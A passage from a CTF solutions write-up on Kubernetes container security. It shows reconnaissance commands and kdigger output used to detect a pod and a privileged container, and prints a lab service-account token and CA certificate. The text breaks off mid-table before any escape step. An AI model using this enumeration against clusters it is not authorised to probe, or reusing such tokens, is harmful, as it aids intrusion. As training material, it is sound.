# Solutions

Obviously, spoilers ahead! Don't read if you want to try the CTF by yourself
before!

## Challenge 0

The challenge scripts are giving away the information that we are running in a
container inside a Kubernetes cluster, of course you already know that because
of the setup process, but this might be interesting to know what to search for
when needing that information.

Am I running inside a Kubernetes cluster container?

Here are a few tips to get that information quickly:
```console
# ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 14:40 ?        00:00:00 /bin/bash -c echo "cat /root/.scripts/script.txt" >> /root/.profile; sleep infinity
root           7       1  0 14:40 ?        00:00:00 sleep infinity
root           8       0  0 14:40 pts/0    00:00:00 /bin/bash -l
root          20       8  0 14:43 pts/0    00:00:00 ps -ef
```

It seems that there are very few processes running and that PID 1 is not
systemd (`/sbin/init`) or equivalent, so we might be inside a PID namespace in
a container!

```console
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Checking network is the same, we are in a private network, and we only have the
loopback and eth0 configured. We might be inside a network namespace in a
container!

You can perform similar actions for most of the namespace, it's almost
impossible to be sure you are namespaced (except for the user namespace) but
some appreciation on these kinds of information can give you a really good
idea.  Unfortunately, it's difficult to automate without some expertise.

But how can we detect we are inside a Kubernetes cluster? Here are some hints,
check the Kubernetes default env variables and if a Kubernetes token is mounted
(it is still by default for now: v1.22).

```console
# env
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
HOSTNAME=app-with-rce
KUBELETCTL_VERSION=v1.8
PWD=/
HOME=/root
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
[...]
TERM=xterm
SHLVL=1
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
KUBERNETES_SERVICE_HOST=10.96.0.1
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
```

```console
# ls -la /run/secrets/kubernetes.io/serviceaccount/
total 4
drwxrwxrwt 3 root root  140 Sep 13 14:40 .
drwxr-xr-x 3 root root 4096 Sep 13 14:40 ..
drwxr-xr-x 2 root root  100 Sep 13 14:40 ..2021_09_13_14_40_09.275490690
lrwxrwxrwx 1 root root   31 Sep 13 14:40 ..data -> ..2021_09_13_14_40_09.275490690
lrwxrwxrwx 1 root root   13 Sep 13 14:40 ca.crt -> ..data/ca.crt
lrwxrwxrwx 1 root root   16 Sep 13 14:40 namespace -> ..data/namespace
lrwxrwxrwx 1 root root   12 Sep 13 14:40 token -> ..data/token
```

With this information, we can confidently affirm that we are running inside of a Kubernetes cluster container!

You can have all this information condensed with this `kdigger` command:
```console
# kdigger dig env ps token
### ENVIRONMENT ###
Comment: Typical Kubernetes API service env var was found, we might be running inside a pod.
+-------------------------------+---------------------+
|              NAME             |        VALUE        |
+-------------------------------+---------------------+
| KUBERNETES_PORT_443_TCP_ADDR  | 10.96.0.1           |
| KUBERNETES_SERVICE_HOST       | 10.96.0.1           |
| KUBERNETES_SERVICE_PORT_HTTPS | 443                 |
| KUBELETCTL_VERSION            | v1.8                |
| KUBERNETES_PORT_443_TCP_PORT  | 443                 |
| KUBERNETES_PORT               | tcp://10.96.0.1:443 |
| KUBERNETES_SERVICE_PORT       | 443                 |
| KUBERNETES_PORT_443_TCP       | tcp://10.96.0.1:443 |
| KUBERNETES_PORT_443_TCP_PROTO | tcp                 |
+-------------------------------+---------------------+
### PROCESSES ###
Comment: 4 processes running, systemd not found as the first process
+-----+------+---------+
| PID | PPID |   NAME  |
+-----+------+---------+
|   1 |    0 | bash    |
|   7 |    1 | sleep   |
| 114 |    0 | bash    |
| 133 |  114 | kdigger |
+-----+------+---------+
### TOKEN ###
Comment: A service account token is mounted.
+-----------+---------------------------------------------+---------------------------------------------+
| NAMESPACE |                    TOKEN                    |                      CA                     |
+-----------+---------------------------------------------+---------------------------------------------+
| default   | eyJhbGciOiJSUzI1NiIsImtpZCI6ImpKSVhUcHgxbEd | -----BEGIN CERTIFICATE-----                 |
|           | wNEx4OUlJQWMyWHVXSmJVTk1LLUhFcF9RNndGX0poVW | MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADA |
|           | MifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLm | VMRMwEQYDVQQDEwptaW5p                       |
|           | RlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwI | a3ViZUNBMB4XDTIxMDMyMzE3MDAyMloXDTMxMDMyMjE |
|           | joxNjYzMDgwMDA5LCJpYXQiOjE2MzE1NDQwMDksImlz | 3MDAyMlowFTETMBEGA1UE                       |
|           | cyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN | AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQA |
|           | 2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pby | DggEPADCCAQoCggEBAM/6                       |
|           | I6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7I | qEv1HWFmJZf5Y70T06F9+YUgBgVkKUifLIZcb8gmjKR |
|           | m5hbWUiOiJhcHAtd2l0aC1yY2UiLCJ1aWQiOiIwY2Vm | gROXHdlcAJHPHs7tZiFQ+                       |
|           | Y2RlYi1iZjUzLTQ0OWItOGUzMy1hY2UzMjk3ZGNkOWU | YEv28E46k2qdXj61DTWQAK4ztyGguZIYeVkY5oia23s |
|           | ifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlZm | 6xFhByyqrHbinjSPqQaxm                       |
|           | F1bHQiLCJ1aWQiOiJhMzY2NTcxZi0xYmM4LTRkMzEtY | xHerNE2ae/opzVJNYAYACdxGRorlRAN0OHS0lnCk+fl |
|           | mUwMC04ZjkyNzJiNmYxM2QifSwid2FybmFmdGVyIjox | WjofLURzobtV54PEzMxov                       |
|           | NjMxNTQ3NjE2fSwibmJmIjoxNjMxNTQ0MDA5LCJzdWI | iYoNOkrYVnFe/zryuQPndQmKqElvcz8HC2jYiSikTgd |
|           | iOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdD | CrrGxXABf+kYxBanp7a0a                       |
|           | pkZWZhdWx0In0.Tz9DjbGLfmozFQaxZ_GOKtX4n1H94 | LR/KDeD0Lv+xeRcQ8bbDVwUUy6VHif6k7tOspyiUWW6 |
|           | 69R_bvPK6yv48AMWJc2kmX-9Ph7ZERNq3-k83sSKLdF | uNLAfwZXpzbE6gfdxUx5N                       |
|           | Sbf9c-KJE82LRwDDNtTIC8pqJg0jtf6tLaQ77YvdsAS | FGQTRNT7QMQy7DaEAJ8CAwEAAaNhMF8wDgYDVR0PAQH |
|           | Oq-SscRfSxN1bta8r7SPUVNIhd4UiqdCbB_rXzOwPoP | /BAQDAgKkMB0GA1UdJQQW                       |
|           | G2uhQLg2wkzw-Nnz2AZ_rDNfLSBcBbv0rMvtkO5ET3m | MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8 |
|           | 6ucjQZsBnHZb8C0MATEja_12H81C6B-v-igOz59kcCP | EBTADAQH/MB0GA1UdDgQW                       |
|           | 1QqeogOKyWaHuG11pyklqFhUoBsx2JnfRzRPTcvdkNo | BBSPYIvBWy4s6dZE/Xo/fxd8ktn1aDANBgkqhkiG9w0 |
|           | fEFaO87Mm76rN_p0h1DtaMHiX_3aXGuLjmP-MOdpSZg | BAQsFAAOCAQEApTKOMILF                       |
|           | nsStLX7YmL0g                                | 31MOdaMMAF/SEH9QAN/C7vvE2hE/7aWrtZhUtFFFRpn |
|           |                                             | XBz2S4Xu+P1stEzqfHo6g                       |
|           |                                             | AEXJhWe9RAnCVmHhg3hA5405VHYggmR35WmrCDMqyaB |
|           |                                             | Tpix0YnG1SXetYXE8vLnV                       |
|           |                                             | tVHHmszW7y+h4S+ODovnxxI8eMqr7th0wI5GLjZTUnq |
|           |                                             | zPKGt2l8NhqeaukDvbXth                       |
|           |                                             | KpjekcEbxkaPDJt8AehuLZ/74qAGijMQOLKqXGuwGKC |
|           |                                             | Tf/79PF6ldWCfHKbLpH0r                       |
|           |                                             | tcSeGC5MulXMHEFP9ghLtizT3hQxE1c+//jXYxXt7Zw |
|           |                                             | 6vurzntOPwZwvmYtcTVnM hfG5+fdkU2rIIA==      |
|           |                                             | -----END CERTIFICATE-----                   |
+-----------+---------------------------------------------+---------------------------------------------+
```

## Challenge 1

The idea behind this first step is to see what it means to run in a privileged
container from the inside and see how it completely break the isolation
assumption we usually make on containers.

Note: you can replay an asciinema of the solution with `asciinema play
demo-challenge1.cast`.

Here is one way to find about the situation with simple commands:
```console
# df -h
Filesystem      Size  Used Avail Use% Mounted on
overlay         3.5G  1.9G  1.5G  57% /
tmpfs            64M     0   64M   0% /dev
tmpfs           993M     0  993M   0% /sys/fs/cgroup
/dev/sda1       3.5G  1.9G  1.5G  57% /etc/hosts
shm              64M     0   64M   0% /dev/shm
tmpfs           2.0G   12K  2.0G   1% /run/secrets/kubernetes.io/serviceaccount

# mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/5TDMPCQVD7DLO7ZQ4KO6BTN5L5:/var/lib/docker/overlay2/l/XKQ67U6O2RRN5JDWC6B56JRMSG:/var/lib/docker/overlay2/l/S5J6V522UILUT6XZ7WYHE56N5N:/var/lib/docker/overlay2/l/GG6LDGPTPF634I2WIYTJPEX4GK:/var/lib/docker/overlay2/l/UWBUCRVJW6K3AYS6FBCUUKXRPM:/var/lib/docker/overlay2/l/TSCREVEKN4YATFOQUZU5CFSQRE:/var/lib/docker/overlay2/l/LP7OT4YSNHSC6AFSZF3I4N2AGI:/var/lib/docker/overlay2/l/W3J57UYPK6EZELB53CHBBUY4CV:/var/lib/docker/overlay2/l/ONEVCWXCBM6WLGRSBFH322TH6U:/var/lib/docker/overlay2/l/DZIC3X6RD7BITCSRPFDHKHUNH5,upperdir=/var/lib/docker/overlay2/2a723530920ca6ac1a6b05d28ad4e3614574582986f1ff5e7d24cdb79a76a74a/diff,workdir=/var/lib/docker/overlay2/2a723530920ca6ac1a6b05d28ad4e3614574582986f1ff5e7d24cdb79a76a74a/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
/dev/sda1 on /dev/termination-log type ext4 (rw,relatime)
/dev/sda1 on /root/.scripts type ext4 (ro,relatime)
/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime)
/dev/sda1 on /etc/hostname type ext4 (rw,relatime)
/dev/sda1 on /etc/hosts type ext4 (rw,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k)
tmpfs on /run/secrets/kubernetes.io/serviceaccount type tmpfs (ro,relatime,size=2033280k)

# ls /dev
autofs           loop5               sda1             tty15  tty32  tty5   ttyS0      vcsa4
bsg              loop6               sg0              tty16  tty33  tty50  ttyS1      vcsa5
btrfs-control    loop7               sg1              tty17  tty34  tty51  ttyS2      vcsa6
core             mapper              shm              tty18  tty35  tty52  ttyS3      vcsu
cpu              mem                 snapshot         tty19  tty36  tty53  urandom    vcsu1
cpu_dma_latency  memory_bandwidth    snd              tty2   tty37  tty54  usbmon0    vcsu2
fd               mqueue              sr0              tty20  tty38  tty55  vboxguest  vcsu3
full             net                 stderr           tty21  tty39  tty56  vboxuser   vcsu4
fuse             network_latency     stdin            tty22  tty4   tty57  vcs        vcsu5
hpet             network_throughput  stdout           tty23  tty40  tty58  vcs1       vcsu6
hwrng            null                termination-log  tty24  tty41  tty59  vcs2       vga_arbiter
input            nvram               tty              tty25  tty42  tty6   vcs3       vhost-net
kmsg             port                tty0             tty26  tty43  tty60  vcs4       vhost-vsock
loop-control     ptmx                tty1             tty27  tty44  tty61  vcs5       zero
loop0            pts                 tty10            tty28  tty45  tty62  vcs6
loop1            random              tty11            tty29  tty46  tty63  vcsa
loop2            rfkill              tty12            tty3   tty47  tty7   vcsa1
loop3            rtc0                tty13            tty30  tty48  tty8   vcsa2
loop4            sda                 tty14            tty31  tty49  tty9   vcsa3

# capsh --print
Current: =eip
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Ambient set =
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=
Guessed mode: UNCERTAIN (0)
```

Here we found that we have a lot of capabilities, especially `CAP_SYS_ADMIN`,
that a lot of devices were available and that a disk, maybe from the host is
mounted.

`kdigger` can also make this process systematic:
```console
# kdigger dig cap dev mount
### CAPABILITIES ###
Comment: The bounding set contains 38 caps and you have CAP_SYS_ADMIN, you might be running a privileged container, check the number of devices available.
+-------------+--------------------------------------------------------------------+
|     SET     |                            CAPABILITIES                            |
+-------------+--------------------------------------------------------------------+
| effective   | [chown dac_override dac_read_search fowner fsetid kill setgid      |
|             | setuid setpcap linux_immutable net_bind_service net_broadcast      |
|             | net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio          |
|             | sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice        |
|             | sys_resource sys_time sys_tty_config mknod lease audit_write       |
|             | audit_control setfcap mac_override mac_admin syslog wake_alarm     |
|             | block_suspend audit_read]                                          |
| permitted   | [chown dac_override dac_read_search fowner fsetid kill setgid      |
|             | setuid setpcap linux_immutable net_bind_service net_broadcast      |
|             | net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio          |
|             | sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice        |
|             | sys_resource sys_time sys_tty_config mknod lease audit_write       |
|             | audit_control setfcap mac_override mac_admin syslog wake_alarm     |
|             | block_suspend audit_read]                                          |
| inheritable | [chown dac_override dac_read_search fowner fsetid kill setgid      |
|             | setuid setpcap linux_immutable net_bind_service net_broadcast      |
|             | net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio          |
|             | sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice        |
|             | sys_resource sys_time sys_tty_config mknod lease audit_write       |
|             | audit_control setfcap mac_override mac_admin syslog wake_alarm     |
|             | block_suspend audit_read]                                          |
| bounding    | [chown dac_override dac_read_search fowner fsetid kill setgid      |
|             | setuid setpcap linux_immutable net_bind_service net_broadcast      |
|             | net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio          |
|             | sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice        |
|             | sys_resource sys_time sys_tty_config mknod lease audit_write       |
|             | audit_control setfcap mac_override mac_admin syslog wake_alarm     |
|             | block_suspend audit_read]                                          |
| ambient     | []                                                                 |
+-------------+--------------------------------------------------------------------+
### DEVICES ###
Comment: 147 devices are available.
+-------------+-------+----------------------+--------------------+
|     MODE    | ISDIR |        MODTIME       |        NAME        |
+-------------+-------+----------------------+--------------------+
| Dcrw-r--r-- | false | 2021-09-13T14:40:27Z | autofs             |
| drwxr-xr-x  | true  | 2021-09-13T14:40:27Z | bsg                |
| Dcrw------- | false | 2021-09-13T14:40:27Z | btrfs-control      |
| Lrwxrwxrwx  | false | 2021-09-13T14:40:27Z | core               |
| drwxr-xr-x  | true  | 2021-09-13T14:40:27Z | cpu                |
| Dcrw------- | false | 2021-09-13T14:40:27Z | cpu_dma_latency    |
| Lrwxrwxrwx  | false | 2021-09-13T14:40:27Z | fd                 |
| Dcrw-rw-rw- | false | 2021-09-13T14:40:27Z | full               |
| Dcrw-rw-rw- | false | 2021-09-13T14:40:27Z | fuse               |
| Dcrw------- | false | 2021-09-13T14:40:27Z | hpet               |
| Dcrw------- | false | 2021-09-13T14:40:27Z | hwrng              |
| drwxr-xr-x  | true  | 2021-09-13T14:40:27Z | input              |
| Dcrw-r--r-- | false | 2021-09-13T14:40:27Z | kmsg               |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | loop-control       |
| Drw-rw----  | false | 2021-09-13T14:40:27Z | loop0              |
| Drw-rw----  | false | 2021-09-13T14:40:27Z | loop1              |
| Drw-rw----  | false | 2021-09-13T14:40:27Z | loop2              |
| Drw-rw----  | false | 2021-09-13T14:40:27Z | loop3              |
| Drw-rw----  | false | 2021-09-13T14:40:27Z | loop4              |
| Drw-rw----  | false | 2021-09-13T14:40:27Z | loop5              |
| Drw-rw----  | false | 2021-09-13T14:40:27Z | loop6              |
| Drw-rw----  | false | 2021-09-13T14:40:27Z | loop7              |
| drwxr-xr-x  | true  | 2021-09-13T14:40:27Z | mapper             |
| Dcrw-r----- | false | 2021-09-13T14:40:27Z | mem                |
| Dcrw------- | false | 2021-09-13T14:40:27Z | memory_bandwidth   |
| dtrwxrwxrwx | true  | 2021-09-13T14:40:09Z | mqueue             |
| drwxr-xr-x  | true  | 2021-09-13T14:40:27Z | net                |
| Dcrw------- | false | 2021-09-13T14:40:27Z | network_latency    |
| Dcrw------- | false | 2021-09-13T14:40:27Z | network_throughput |
| Dcrw-rw-rw- | false | 2021-09-13T14:40:27Z | null               |
| Dcrw------- | false | 2021-09-13T14:40:27Z | nvram              |
| Dcrw-r----- | false | 2021-09-13T14:40:27Z | port               |
| Lrwxrwxrwx  | false | 2021-09-13T14:40:27Z | ptmx               |
| drwxr-xr-x  | true  | 2021-09-13T14:40:27Z | pts                |
| Dcrw-rw-rw- | false | 2021-09-13T14:40:27Z | random             |
| Dcrw-rw-r-- | false | 2021-09-13T14:40:27Z | rfkill             |
| Dcrw------- | false | 2021-09-13T14:40:27Z | rtc0               |
| Drw-rw----  | false | 2021-09-13T14:40:27Z | sda                |
| Drw-rw----  | false | 2021-09-13T14:40:27Z | sda1               |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | sg0                |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | sg1                |
| dtrwxrwxrwx | true  | 2021-09-13T14:40:09Z | shm                |
| Dcrw------- | false | 2021-09-13T14:40:27Z | snapshot           |
| drwxr-xr-x  | true  | 2021-09-13T14:40:27Z | snd                |
| Drw-rw----  | false | 2021-09-13T14:40:27Z | sr0                |
| Lrwxrwxrwx  | false | 2021-09-13T14:40:27Z | stderr             |
| Lrwxrwxrwx  | false | 2021-09-13T14:40:27Z | stdin              |
| Lrwxrwxrwx  | false | 2021-09-13T14:40:27Z | stdout             |
| -rw-rw-rw-  | false | 2021-09-13T14:40:27Z | termination-log    |
| Dcrw-rw-rw- | false | 2021-09-13T14:40:27Z | tty                |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty0               |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty1               |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty10              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty11              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty12              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty13              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty14              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty15              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty16              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty17              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty18              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty19              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty2               |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty20              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty21              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty22              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty23              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty24              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty25              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty26              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty27              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty28              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty29              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty3               |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty30              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty31              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty32              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty33              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty34              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty35              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty36              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty37              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty38              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty39              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty4               |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty40              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty41              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty42              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty43              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty44              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty45              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty46              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty47              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty48              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty49              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty5               |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty50              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty51              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty52              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty53              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty54              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty55              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty56              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty57              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty58              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty59              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty6               |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty60              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty61              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty62              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty63              |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty7               |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty8               |
| Dcrw--w---- | false | 2021-09-13T14:40:27Z | tty9               |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | ttyS0              |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | ttyS1              |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | ttyS2              |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | ttyS3              |
| Dcrw-rw-rw- | false | 2021-09-13T14:40:27Z | urandom            |
| Dcrw------- | false | 2021-09-13T14:40:27Z | usbmon0            |
| Dcrw------- | false | 2021-09-13T14:40:27Z | vboxguest          |
| Dcrw------- | false | 2021-09-13T14:40:27Z | vboxuser           |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcs                |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcs1               |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcs2               |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcs3               |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcs4               |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcs5               |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcs6               |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcsa               |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcsa1              |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcsa2              |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcsa3              |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcsa4              |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcsa5              |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcsa6              |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcsu               |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcsu1              |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcsu2              |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcsu3              |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcsu4              |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcsu5              |
| Dcrw-rw---- | false | 2021-09-13T14:40:27Z | vcsu6              |
| Dcrw------- | false | 2021-09-13T14:40:27Z | vga_arbiter        |
| Dcrw------- | false | 2021-09-13T14:40:27Z | vhost-net          |
| Dcrw------- | false | 2021-09-13T14:40:27Z | vhost-vsock        |
| Dcrw-rw-rw- | false | 2021-09-13T14:40:27Z | zero               |
+-------------+-------+----------------------+--------------------+
### MOUNT ###
Comment: 25 devices are mounted.
+-----------+---------------------------------+------------+---------------------------------+
|   DEVICE  |               PATH              | FILESYSTEM |              FLAGS              |
+-----------+---------------------------------+------------+---------------------------------+
| overlay   | /                               | overlay    | rw,relatime,lowerdir=/var/lib/d |
|           |                                 |            | ocker/overlay2/l/5TDMPCQVD7DLO7 |
|           |                                 |            | ZQ4KO6BTN5L5:/var/lib/docker/ov |
|           |                                 |            | erlay2/l/XKQ67U6O2RRN5JDWC6B56J |
|           |                                 |            | RMSG:/var/lib/docker/overlay2/l |
|           |                                 |            | /S5J6V522UILUT6XZ7WYHE56N5N:/va |
|           |                                 |            | r/lib/docker/overlay2/l/GG6LDGP |
|           |                                 |            | TPF634I2WIYTJPEX4GK:/var/lib/do |
|           |                                 |            | cker/overlay2/l/UWBUCRVJW6K3AYS |
|           |                                 |            | 6FBCUUKXRPM:/var/lib/docker/ove |
|           |                                 |            | rlay2/l/TSCREVEKN4YATFOQUZU5CFS |
|           |                                 |            | QRE:/var/lib/docker/overlay2/l/ |
|           |                                 |            | LP7OT4YSNHSC6AFSZF3I4N2AGI:/var |
|           |                                 |            | /lib/docker/overlay2/l/W3J57UYP |
|           |                                 |            | K6EZELB53CHBBUY4CV:/var/lib/doc |
|           |                                 |            | ker/overlay2/l/ONEVCWXCBM6WLGRS |
|           |                                 |            | BFH322TH6U:/var/lib/docker/over |
|           |                                 |            | lay2/l/DZIC3X6RD7BITCSRPFDHKHUN |
|           |                                 |            | H5,upperdir=/var/lib/docker/ove |
|           |                                 |            | rlay2/2a723530920ca6ac1a6b05d28 |
